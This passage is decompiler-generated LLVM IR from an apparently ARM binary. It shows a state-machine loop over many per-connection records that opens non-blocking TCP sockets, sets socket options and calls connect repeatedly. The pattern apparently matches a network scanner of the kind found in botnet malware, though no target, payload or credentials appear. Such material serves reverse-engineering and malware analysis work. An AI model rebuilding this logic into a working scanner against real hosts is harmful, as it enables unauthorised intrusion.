  store i32 %v1_91a0, i32* @r0, align 4
  %v2_91a4 = inttoptr i32 %v1_91a0 to i8*
  %v3_91a4 = call i32 @function_14634(i8* %v2_91a4, i32 %v0_919c)
  %v0_91a8 = load i32, i32* @r5, align 4
  %v0_91ac = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_91ac, i32* %r1.global-to-local, align 4
  %v1_91b0 = add i32 %v0_91a8, 1431
  store i32 %v1_91b0, i32* @r0, align 4
  %v2_91b4 = inttoptr i32 %v1_91b0 to i8*
  %v3_91b4 = call i32 @function_14634(i8* %v2_91b4, i32 %v0_91ac)
  %v0_91b8 = load i32, i32* @r5, align 4
  %v1_91bc = add i32 %v0_91b8, 789
  store i32 %v1_91bc, i32* @r0, align 4
  %v0_91c0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_91c0, i32* %r1.global-to-local, align 4
  %v2_91c4 = inttoptr i32 %v1_91bc to i8*
  %v3_91c4 = call i32 @function_14634(i8* %v2_91c4, i32 %v0_91c0)
  store i32 %v3_91c4, i32* %r0.global-to-local, align 4
  %v0_91c8 = load i32, i32* @r6, align 4
  %v1_91c8 = add i32 %v0_91c8, 20
  %v2_91c8 = inttoptr i32 %v1_91c8 to i8*
  %v3_91c8 = load i8, i8* %v2_91c8, align 1
  %v4_91c8 = zext i8 %v3_91c8 to i32
  store i32 %v4_91c8, i32* %r3.global-to-local, align 4
  %v2_91cc = icmp ugt i8 %v3_91c8, 30
  store i1 %v2_91cc, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_91cc = icmp ult i8 %v3_91c8, 31
  store i1 %v6_91cc, i1* %cpsr_n.global-to-local, align 1
  %v7_91cc = icmp eq i8 %v3_91c8, 31
  store i1 %v7_91cc, i1* %cpsr_z.global-to-local, align 1
  %v2_91d0 = xor i1 %v7_91cc, true
  %v3_91d0 = and i1 %v2_91cc, %v2_91d0
  br i1 %v3_91d0, label %dec_label_pc_abc8, label %dec_label_pc_91d4

dec_label_pc_91d4:                                ; preds = %dec_label_pc_919c
  %v1_91d4 = add i32 %v0_91c8, 16
  %v2_91d4 = inttoptr i32 %v1_91d4 to i32*
  %v3_91d4 = load i32, i32* %v2_91d4, align 4
  store i32 %v3_91d4, i32* @r4, align 4
  %v0_91d8 = call i32 @function_117dc()
  store i32 %v0_91d8, i32* %r0.global-to-local, align 4
  %v0_91dc = load i32, i32* @r4, align 4
  %v1_91e0 = and i32 %v0_91dc, 65280
  store i32 %v1_91e0, i32* %r3.global-to-local, align 4
  %v1_91dc = udiv i32 %v0_91dc, 256
  %v3_91e4 = and i32 %v1_91dc, 65280
  store i32 %v3_91e4, i32* %r2.global-to-local, align 4
  %v3_91e8 = mul i32 %v0_91dc, 16777216
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_91ec = mul nuw nsw i32 %v1_91e0, 256
  %v5_91ec = or i32 %v4_91ec, %v3_91e8
  store i32 %v5_91ec, i32* %r1.global-to-local, align 4
  %v0_91f0 = load i32, i32* @r6, align 4
  %v1_91f0 = add i32 %v0_91f0, 20
  %v2_91f0 = inttoptr i32 %v1_91f0 to i8*
  %v3_91f0 = load i8, i8* %v2_91f0, align 1
  %v4_91f0 = zext i8 %v3_91f0 to i32
  store i32 %v4_91f0, i32* %ip.global-to-local, align 4
  %v2_91f8 = call i32 @llvm.bswap.i32(i32 %v0_91dc)
  %v7_91fc = lshr i32 %v0_91d8, %v4_91f0
  %v8_91fc = add i32 %v7_91fc, %v2_91f8
  store i32 %v8_91fc, i32* %r2.global-to-local, align 4
  %v3_9208 = mul i32 %v8_91fc, 16777216
  %v1_920c = and i32 %v8_91fc, 65280
  store i32 %v1_920c, i32* %r0.global-to-local, align 4
  %v4_9210 = mul nuw nsw i32 %v1_920c, 256
  %v5_9210 = or i32 %v4_9210, %v3_9208
  store i32 %v5_9210, i32* %r1.global-to-local, align 4
  %v2_9214 = and i32 %v8_91fc, 8388608
  %v3_9214 = icmp ne i32 %v2_9214, 0
  store i1 %v3_9214, i1* %cpsr_c.global-to-local, align 1
  %v2_9218 = call i32 @llvm.bswap.i32(i32 %v8_91fc)
  store i32 %v2_9218, i32* %r3.global-to-local, align 4
  %v1_921c = load i32, i32* @r5, align 4
  %v2_921c = add i32 %v1_921c, 16
  %v3_921c = inttoptr i32 %v2_921c to i32*
  store i32 %v2_9218, i32* %v3_921c, align 4
  br label %dec_label_pc_abc8

dec_label_pc_924c:                                ; preds = %thread-pre-split
  %v1_9250 = add i32 %v2_9108, 1456
  %v0_9258 = load i32, i32* %r8.global-to-local, align 4
  %v1_9258 = urem i32 %v0_9258, 256
  store i32 %v1_9258, i32* %r3.global-to-local, align 4
  %v1_925c = add i32 %v2_9108, 1464
  store i32 %v1_925c, i32* %r1.global-to-local, align 4
  %v2_9260 = ptrtoint i32* %stack_var_-10568 to i32
  store i32 %v2_9260, i32* %r2.global-to-local, align 4
  store i32 %v1_9250, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_9280.preheader

dec_label_pc_9280.preheader:                      ; preds = %dec_label_pc_924c, %dec_label_pc_abec
  %storemerge148.in.in = phi i32 [ %v0_ac00, %dec_label_pc_abec ], [ %v0_9258, %dec_label_pc_924c ]
  %stack_var_-20868.0.ph = phi i32 [ %v1_abf8, %dec_label_pc_abec ], [ %v1_9250, %dec_label_pc_924c ]
  %stack_var_-20860.0.ph = phi i32 [ %v1_ac00, %dec_label_pc_abec ], [ %v1_9258, %dec_label_pc_924c ]
  %stack_var_-20872.0.ph = phi i32 [ %v1_ac04, %dec_label_pc_abec ], [ %v1_925c, %dec_label_pc_924c ]
  %stack_var_-20856.0.ph = phi i32 [ %v2_ac08, %dec_label_pc_abec ], [ %v2_9260, %dec_label_pc_924c ]
  %storemerge148.in = and i32 %storemerge148.in.in, 128
  %storemerge148 = icmp ne i32 %storemerge148.in, 0
  store i1 %storemerge148, i1* %cpsr_c.global-to-local, align 1
  %v3_ac10 = udiv i32 %storemerge148.in.in, 256
  store i32 %v3_ac10, i32* %r8.global-to-local, align 4
  %v4_92e8 = mul nuw nsw i32 %stack_var_-20860.0.ph, 256
  %v2_9428 = ptrtoint i32* %stack_var_-148 to i32
  %v2_9440 = ptrtoint i32* %stack_var_-40 to i32
  %v2_9480 = ptrtoint i32* %stack_var_-72 to i32
  %v2_94a0 = ptrtoint i32* %stack_var_-36 to i32
  %v1_9698 = inttoptr i32 %stack_var_-20856.0.ph to i8*
  %v1_99ec = icmp slt i32 %v6_8f58, 0
  %v2_99ec = icmp eq i32 %v6_8f58, 0
  %v1_98e8 = inttoptr i32 %v6_8f58 to i8*
  %v2_950c = ptrtoint i32* %stack_var_-56 to i32
  %v2_9510 = ptrtoint i32* %stack_var_-200 to i32
  %v2_9514 = ptrtoint i32* %stack_var_-328 to i32
  %v2_9f74 = add i32 %v2_94a0, -20773
  %v2_9600 = ptrtoint i32* %stack_var_-44 to i32
  %v2_960c = ptrtoint i32* %stack_var_-48 to i32
  %v5_92e8 = or i32 %v4_92e8, %v3_ac10
  %v1_92ec = and i32 %v3_ac10, 128
  %v2_92ec = icmp ne i32 %v1_92ec, 0
  %v3_92ec248 = udiv i32 %v5_92e8, 256
  %v1_92f4 = add i32 %stack_var_-20872.0.ph, -1464
  %v1_92fc = add i32 %stack_var_-20872.0.ph, -33
  %sext = mul i32 %v3_92ec248, 16777216
  %v4_9468 = sdiv i32 %sext, 16777216
  %sext10 = mul i32 %v3_ac10, 16777216
  %v4_9470 = sdiv i32 %sext10, 16777216
  %v2_9334 = add i32 %v2_9428, 112
  br label %dec_label_pc_9280

dec_label_pc_9280:                                ; preds = %dec_label_pc_94ec, %dec_label_pc_92cc, %dec_label_pc_94e4, %dec_label_pc_9590, %dec_label_pc_9280.preheader
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_9284 = call i32 @_time(i32 0)
  store i32 %v1_9284, i32* %r0.global-to-local, align 4
  store i32 %v1_9284, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 20684, i32* %ip.global-to-local, align 4
  %v2_92a4256 = load i32, i32* @sp, align 4
  %v3_92a4257 = add i32 %v2_92a4256, 20684
  %v4_92a4258 = inttoptr i32 %v3_92a4257 to i32*
  store i32 0, i32* %v4_92a4258, align 4
  br label %dec_label_pc_9294.dec_label_pc_9294_crit_edge

dec_label_pc_9294.dec_label_pc_9294_crit_edge:    ; preds = %dec_label_pc_9280, %dec_label_pc_9294.dec_label_pc_9294_crit_edge
  %v0_9294.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_92a4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_9298 = add i32 %v0_9294.pre, 4
  store i32 %v1_9298, i32* %r3.global-to-local, align 4
  %v1_929c = add i32 %v0_9294.pre, 20684
  store i32 %v1_929c, i32* %ip.global-to-local, align 4
  %v7_92a0 = icmp eq i32 %v1_9298, 128
  %v2_92a4 = load i32, i32* @sp, align 4
  %v3_92a4 = add i32 %v2_92a4, %v1_929c
  %v4_92a4 = inttoptr i32 %v3_92a4 to i32*
  store i32 %v0_92a4.pre, i32* %v4_92a4, align 4
  br i1 %v7_92a0, label %dec_label_pc_92ac, label %dec_label_pc_9294.dec_label_pc_9294_crit_edge

dec_label_pc_92ac:                                ; preds = %dec_label_pc_9294.dec_label_pc_9294_crit_edge
  %v1_92a0 = add i32 %v0_9294.pre, -124
  %v6_92a0 = icmp slt i32 %v1_92a0, 0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_92a0, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_92ac = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_92ac, i32* %r0.global-to-local, align 4
  %v1_92b8259 = add i32 %v0_92ac, 4
  store i32 %v1_92b8259, i32* %r3.global-to-local, align 4
  %v1_92bc260 = add i32 %v0_92ac, 20556
  store i32 %v1_92bc260, i32* %lr.global-to-local, align 4
  %v7_92c0261 = icmp eq i32 %v1_92b8259, 128
  %v2_92c4262 = load i32, i32* @sp, align 4
  %v3_92c4263 = add i32 %v2_92c4262, %v1_92bc260
  %v4_92c4264 = inttoptr i32 %v3_92c4263 to i32*
  store i32 %v0_92ac, i32* %v4_92c4264, align 4
  br i1 %v7_92c0261, label %dec_label_pc_92cc, label %dec_label_pc_92b4.dec_label_pc_92b4_crit_edge

dec_label_pc_92b4.dec_label_pc_92b4_crit_edge:    ; preds = %dec_label_pc_92ac, %dec_label_pc_92b4.dec_label_pc_92b4_crit_edge
  %v0_92b4.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_92c4.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_92b8 = add i32 %v0_92b4.pre, 4
  store i32 %v1_92b8, i32* %r3.global-to-local, align 4
  %v1_92bc = add i32 %v0_92b4.pre, 20556
  store i32 %v1_92bc, i32* %lr.global-to-local, align 4
  %v7_92c0 = icmp eq i32 %v1_92b8, 128
  %v2_92c4 = load i32, i32* @sp, align 4
  %v3_92c4 = add i32 %v2_92c4, %v1_92bc
  %v4_92c4 = inttoptr i32 %v3_92c4 to i32*
  store i32 %v0_92c4.pre, i32* %v4_92c4, align 4
  br i1 %v7_92c0, label %dec_label_pc_92cc, label %dec_label_pc_92b4.dec_label_pc_92b4_crit_edge

dec_label_pc_92cc:                                ; preds = %dec_label_pc_92b4.dec_label_pc_92b4_crit_edge, %dec_label_pc_92ac
  store i32 %v0_90f4, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v1_9110, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_9110, i1* %cpsr_z.global-to-local, align 1
  br i1 %tmp207, label %dec_label_pc_9280, label %dec_label_pc_92d8

dec_label_pc_92d8:                                ; preds = %dec_label_pc_92cc
  store i32 %stack_var_-20872.0.ph, i32* %ip.global-to-local, align 4
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 %v5_92e8, i32* %r2.global-to-local, align 4
  store i1 %v2_92ec, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_92ec248, i32* %lr.global-to-local, align 4
  %v0_92f0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_92f0, i32* @sl, align 4
  store i32 %v1_92f4, i32* @r7, align 4
  store i32 %v0_92f0, i32* @r8, align 4
  store i32 %v1_92fc, i32* @r6, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_93a8

dec_label_pc_9310:                                ; preds = %dec_label_pc_93b4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v7_9310 = icmp eq i8 %v3_93a8, 2
  store i1 %v7_9310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9310, label %dec_label_pc_9ac0, label %dec_label_pc_9318

dec_label_pc_9318:                                ; preds = %dec_label_pc_9310
  %v2_9318 = icmp ugt i8 %v3_93a8, 3
  store i1 %v2_9318, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9318 = icmp ult i8 %v3_93a8, 4
  store i1 %v6_9318, i1* %cpsr_n.global-to-local, align 1
  %v7_9318 = icmp eq i8 %v3_93a8, 4
  store i1 %v7_9318, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9318, label %dec_label_pc_9664, label %dec_label_pc_9320

dec_label_pc_9320:                                ; preds = %dec_label_pc_9318
  %v2_9320 = icmp ugt i8 %v3_93a8, 5
  store i1 %v2_9320, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9320 = icmp ult i8 %v3_93a8, 6
  store i1 %v6_9320, i1* %cpsr_n.global-to-local, align 1
  %v7_9320 = icmp eq i8 %v3_93a8, 6
  store i1 %v7_9320, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9320, label %.thread24, label %dec_label_pc_9340

.thread24:                                        ; preds = %dec_label_pc_9320
  %v2_9324 = add i32 %v3_9658, -1431
  %v3_9324 = inttoptr i32 %v2_9324 to i32*
  %v4_9324 = load i32, i32* %v3_9324, align 4
  store i32 %v4_9324, i32* %r0.global-to-local, align 4
  %v4_932c = udiv i32 %v4_9324, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_9330 = mul nuw nsw i32 %v4_932c, 4
  store i32 %v2_9334, i32* %r1.global-to-local, align 4
  %v3_9338 = add i32 %v4_9330, %v2_9334
  store i32 %v3_9338, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9aa0

dec_label_pc_9340:                                ; preds = %dec_label_pc_9320
  %v2_9340 = icmp ugt i8 %v3_93a8, 6
  store i1 %v2_9340, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9340 = icmp ult i8 %v3_93a8, 7
  store i1 %v6_9340, i1* %cpsr_n.global-to-local, align 1
  %v7_9340 = icmp eq i8 %v3_93a8, 7
  store i1 %v7_9340, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9340, label %.thread35, label %dec_label_pc_9360

.thread35:                                        ; preds = %dec_label_pc_9340
  %v2_9344 = add i32 %v3_9658, -1431
  %v3_9344 = inttoptr i32 %v2_9344 to i32*
  %v4_9344 = load i32, i32* %v3_9344, align 4
  store i32 %v4_9344, i32* %r0.global-to-local, align 4
  %v4_934c = udiv i32 %v4_9344, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_9350 = mul nuw nsw i32 %v4_934c, 4
  store i32 %v2_9334, i32* %r2.global-to-local, align 4
  %v3_9358 = add i32 %v4_9350, %v2_9334
  store i32 %v3_9358, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9aa0

dec_label_pc_9360:                                ; preds = %dec_label_pc_9340
  %v2_9360 = icmp ugt i8 %v3_93a8, 9
  store i1 %v2_9360, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9360 = icmp ult i8 %v3_93a8, 10
  store i1 %v6_9360, i1* %cpsr_n.global-to-local, align 1
  %v7_9360 = icmp eq i8 %v3_93a8, 10
  store i1 %v7_9360, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9360, label %dec_label_pc_9a88, label %dec_label_pc_9368

dec_label_pc_9368:                                ; preds = %dec_label_pc_9360
  %v1_9368 = add nsw i32 %v4_93a8, -11
  %v2_9368 = icmp ugt i8 %v3_93a8, 10
  store i1 %v2_9368, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9368 = icmp ult i8 %v3_93a8, 11
  store i1 %v6_9368, i1* %cpsr_n.global-to-local, align 1
  %v7_9368 = icmp eq i8 %v3_93a8, 11
  store i1 %v7_9368, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9368, label %dec_label_pc_a5fc, label %dec_label_pc_9370

dec_label_pc_9370:                                ; preds = %dec_label_pc_9ac0, %dec_label_pc_9368
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v2_93a8, align 1
  %v0_9378 = load i32, i32* @r6, align 4
  %v1_9378 = add i32 %v0_9378, -1431
  %v2_9378 = inttoptr i32 %v1_9378 to i32*
  %v3_9378 = load i32, i32* %v2_9378, align 4
  store i32 %v3_9378, i32* %r0.global-to-local, align 4
  %v1_937c = call i32 @_close(i32 %v3_9378)
  store i32 %v1_937c, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_9384 = load i32, i32* @r6, align 4
  %v2_9384 = add i32 %v1_9384, -1431
  %v3_9384 = inttoptr i32 %v2_9384 to i32*
  store i32 -1, i32* %v3_9384, align 4
  br label %dec_label_pc_9388

dec_label_pc_9388:                                ; preds = %dec_label_pc_9a24, %dec_label_pc_9aa0, %dec_label_pc_94a8, %dec_label_pc_93bc, %dec_label_pc_a5fc, %dec_label_pc_9370
  store i32 %v0_90f4, i32* %lr.global-to-local, align 4
  %v0_938c = load i32, i32* @r8, align 4
  %v1_938c = add i32 %v0_938c, 1
  store i32 %v1_938c, i32* @r8, align 4
  %v0_9390 = load i32, i32* @r7, align 4
  %v0_9394 = load i32, i32* @r6, align 4
  %v2_9398 = sub i32 %v0_90f4, %v1_938c
  %v3_9398 = icmp uge i32 %v0_90f4, %v1_938c
  store i1 %v3_9398, i1* %cpsr_c.global-to-local, align 1
  %v4_9398 = xor i32 %v1_938c, %v0_90f4
  %v5_9398 = xor i32 %v2_9398, %v0_90f4
  %v6_9398 = and i32 %v5_9398, %v4_9398
  %v7_9398 = icmp slt i32 %v6_9398, 0
  store i1 %v7_9398, i1* %cpsr_v.global-to-local, align 1
  %v8_9398 = icmp slt i32 %v2_9398, 0
  store i1 %v8_9398, i1* %cpsr_n.global-to-local, align 1
  %v9_9398 = icmp eq i32 %v0_90f4, %v1_938c
  store i1 %v9_9398, i1* %cpsr_z.global-to-local, align 1
  %v1_939c = add i32 %v0_9390, 3140
  store i32 %v1_939c, i32* @r7, align 4
  %v1_93a0 = add i32 %v0_9394, 3140
  store i32 %v1_93a0, i32* @r6, align 4
  br i1 %v9_9398, label %dec_label_pc_9388.dec_label_pc_94e4_crit_edge, label %dec_label_pc_93a8

dec_label_pc_9388.dec_label_pc_94e4_crit_edge:    ; preds = %dec_label_pc_9388
  %v0_94e4.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_94e4

dec_label_pc_93a8:                                ; preds = %dec_label_pc_94c4, %dec_label_pc_9388, %dec_label_pc_92d8
  %v3_9658 = phi i32 [ %v1_92fc, %dec_label_pc_92d8 ], [ %v1_93a0, %dec_label_pc_9388 ], [ %v1_94dc, %dec_label_pc_94c4 ]
  %v1_93a8 = add i32 %v3_9658, -1427
  %v2_93a8 = inttoptr i32 %v1_93a8 to i8*
  %v3_93a8 = load i8, i8* %v2_93a8, align 1
  %v4_93a8 = zext i8 %v3_93a8 to i32
  store i32 %v4_93a8, i32* %r3.global-to-local, align 4
  %v2_93ac = icmp ne i8 %v3_93a8, 0
  store i1 %v2_93ac, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_93ac = icmp eq i8 %v3_93a8, 0
  store i1 %v6_93ac, i1* %cpsr_n.global-to-local, align 1
  %v7_93ac = icmp eq i8 %v3_93a8, 1
  store i1 %v7_93ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_93ac, label %dec_label_pc_964c, label %dec_label_pc_93b4

dec_label_pc_93b4:                                ; preds = %dec_label_pc_93a8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 %v6_93ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_93ac, label %dec_label_pc_93bc, label %dec_label_pc_9310

dec_label_pc_93bc:                                ; preds = %.thread43.dec_label_pc_93bc_crit_edge, %dec_label_pc_93b4
  %v0_93bc = phi i32 [ %v0_93bc.pre, %.thread43.dec_label_pc_93bc_crit_edge ], [ %v3_9658, %dec_label_pc_93b4 ]
  %v1_93bc = add i32 %v0_93bc, -1431
  %v2_93bc = inttoptr i32 %v1_93bc to i32*
  %v3_93bc = load i32, i32* %v2_93bc, align 4
  store i32 %v3_93bc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v1_93c8 = add i32 %v3_93bc, 1
  %v2_93c8 = icmp eq i32 %v3_93bc, -1
  store i1 %v2_93c8, i1* %cpsr_c.global-to-local, align 1
  %v3_93c8 = sub i32 0, %v3_93bc
  %v4_93c8 = and i32 %v1_93c8, %v3_93c8
  %v5_93c8 = icmp slt i32 %v4_93c8, 0
  store i1 %v5_93c8, i1* %cpsr_v.global-to-local, align 1
  %v6_93c8 = icmp slt i32 %v1_93c8, 0
  store i1 %v6_93c8, i1* %cpsr_n.global-to-local, align 1
  %v7_93c8 = icmp eq i32 %v1_93c8, 0
  store i1 %v7_93c8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-72, align 4
  store i32 37856, i32* %lr.global-to-local, align 4
  %v1_93dc = xor i1 %v7_93c8, true
  call void @__pseudo_cond_branch(i1 %v1_93dc, i32 ptrtoint (i32* @global_var_8dcc.80 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_93e8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_93e8, i32* %r2.global-to-local, align 4
  %v3_93ec = call i32 @_socket(i32 2, i32 1, i32 %v0_93e8)
  store i32 %v3_93ec, i32* %r0.global-to-local, align 4
  %v1_93f0 = add i32 %v3_93ec, 1
  %v2_93f0 = icmp eq i32 %v3_93ec, -1
  store i1 %v2_93f0, i1* %cpsr_c.global-to-local, align 1
  %v3_93f0 = sub i32 0, %v3_93ec
  %v4_93f0 = and i32 %v1_93f0, %v3_93f0
  %v5_93f0 = icmp slt i32 %v4_93f0, 0
  store i1 %v5_93f0, i1* %cpsr_v.global-to-local, align 1
  %v6_93f0 = icmp slt i32 %v1_93f0, 0
  store i1 %v6_93f0, i1* %cpsr_n.global-to-local, align 1
  %v7_93f0 = icmp eq i32 %v1_93f0, 0
  store i1 %v7_93f0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_93ec, i32* @r4, align 4
  %v1_93f8 = load i32, i32* @r6, align 4
  %v2_93f8 = add i32 %v1_93f8, -1431
  %v3_93f8 = inttoptr i32 %v2_93f8 to i32*
  store i32 %v3_93ec, i32* %v3_93f8, align 4
  br i1 %v7_93f0, label %dec_label_pc_9388, label %dec_label_pc_9400

dec_label_pc_9400:                                ; preds = %dec_label_pc_93bc
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_9404 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_9404, i32* %r2.global-to-local, align 4
  %v0_9408 = load i32, i32* %r0.global-to-local, align 4
  %v3_9408 = call i32 @_fcntl(i32 %v0_9408, i32 3, i32 %v0_9404)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_9410 = or i32 %v3_9408, 2048
  store i32 %v1_9410, i32* %r2.global-to-local, align 4
  %v0_9414 = load i32, i32* @r4, align 4
  store i32 %v0_9414, i32* %r0.global-to-local, align 4
  %v3_9418 = call i32 @_fcntl(i32 %v0_9414, i32 4, i32 %v1_9410)
  store i32 %v3_9418, i32* %r0.global-to-local, align 4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  store i32 65535, i32* %ip.global-to-local, align 4
  store i32 %v2_9428, i32* %r3.global-to-local, align 4
  %v0_942c = load i32, i32* @r6, align 4
  %v1_942c = add i32 %v0_942c, -1431
  %v2_942c = inttoptr i32 %v1_942c to i32*
  %v3_942c = load i32, i32* %v2_942c, align 4
  store i32 %v3_942c, i32* %r0.global-to-local, align 4
  %v0_9430 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_9430, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %stack_var_-40, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 %v2_9440, i32* %r3.global-to-local, align 4
  %v5_9448 = call i32 @_setsockopt(i32 %v3_942c, i32 %v0_9430, i32 8, i32 %v2_9440, i32 4)
  store i32 %v5_9448, i32* %r0.global-to-local, align 4
  %v0_944c = load i32, i32* @r6, align 4
  %v1_944c = add i32 %v0_944c, -1415
  %v2_944c = inttoptr i32 %v1_944c to i32*
  %v3_944c = load i32, i32* %v2_944c, align 4
  store i32 %v3_944c, i32* %ip.global-to-local, align 4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_945c = add i32 %v0_944c, -1431
  %v2_945c = inttoptr i32 %v1_945c to i32*
  %v3_945c = load i32, i32* %v2_945c, align 4
  store i32 %v3_945c, i32* %r0.global-to-local, align 4
  %v3_9464 = add i32 %v0_944c, -1427
  %v4_9464 = inttoptr i32 %v3_9464 to i8*
  store i8 2, i8* %v4_9464, align 1
  store i32 %v4_9468, i32* %ip.global-to-local, align 4
  %v0_946c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_946c, i32* %stack_var_-72, align 4
  store i32 %v4_9470, i32* %r3.global-to-local, align 4
  store i32 %v2_9480, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_9488 = load i32, i32* %sb.global-to-local, align 4
  %v1_9488 = load i32, i32* @r6, align 4
  %v2_9488 = add i32 %v1_9488, -1423
  %v3_9488 = inttoptr i32 %v2_9488 to i32*
  store i32 %v0_9488, i32* %v3_9488, align 4
  %v3_948c = call i32 @_connect(i32 %v3_945c, i32 %v2_9480, i32 16)
  store i32 %v3_948c, i32* %r0.global-to-local, align 4
  %v0_9490 = load i32, i32* @r6, align 4
  %v1_9490 = add i32 %v0_9490, -1431
  %v2_9490 = inttoptr i32 %v1_9490 to i32*
  %v3_9490 = load i32, i32* %v2_9490, align 4
  store i32 %v3_9490, i32* %r0.global-to-local, align 4
  %v3_9498 = udiv i32 %v3_9490, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_949c = mul nuw nsw i32 %v3_9498, 4
  store i32 %v3_949c, i32* %r3.global-to-local, align 4
  store i32 %v2_94a0, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_94a8

dec_label_pc_94a8:                                ; preds = %dec_label_pc_9ad0, %dec_label_pc_9400
  %v1_94b4 = phi i32 [ %v3_9490, %dec_label_pc_9400 ], [ %v3_9ad0, %dec_label_pc_9ad0 ]
  %v3_949c.pn = phi i32 [ %v3_949c, %dec_label_pc_9400 ], [ %v3_9adc, %dec_label_pc_9ad0 ]
  %storemerge = add i32 %v3_949c.pn, %v2_94a0
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v1_94a8 = add i32 %storemerge, -292
  %v2_94a8 = inttoptr i32 %v1_94a8 to i32*
  %v3_94a8 = load i32, i32* %v2_94a8, align 4
  %v1_94ac = urem i32 %v1_94b4, 32
  store i32 %v1_94ac, i32* %r1.global-to-local, align 4
  %v1_94b0 = load i32, i32* %fp.global-to-local, align 4
  %v7_94b0 = shl i32 %v1_94b0, %v1_94ac
  %v8_94b0 = or i32 %v7_94b0, %v3_94a8
  store i32 %v8_94b0, i32* %r2.global-to-local, align 4
  %v0_94b4 = load i32, i32* @sl, align 4
  %v2_94b4 = sub i32 %v0_94b4, %v1_94b4
  %v3_94b4 = icmp uge i32 %v0_94b4, %v1_94b4
  store i1 %v3_94b4, i1* %cpsr_c.global-to-local, align 1
  %v4_94b4 = xor i32 %v0_94b4, %v1_94b4
  %v5_94b4 = xor i32 %v2_94b4, %v0_94b4
  %v6_94b4 = and i32 %v5_94b4, %v4_94b4
  %v7_94b4 = icmp slt i32 %v6_94b4, 0
  store i1 %v7_94b4, i1* %cpsr_v.global-to-local, align 1
  %v8_94b4 = icmp slt i32 %v2_94b4, 0
  store i1 %v8_94b4, i1* %cpsr_n.global-to-local, align 1
  %v9_94b4 = icmp eq i32 %v0_94b4, %v1_94b4
  store i1 %v9_94b4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_94b0, i32* %v2_94a8, align 4
  %v2_94bc = xor i1 %v8_94b4, %v7_94b4
  br i1 %v2_94bc, label %dec_label_pc_94c0, label %dec_label_pc_9388

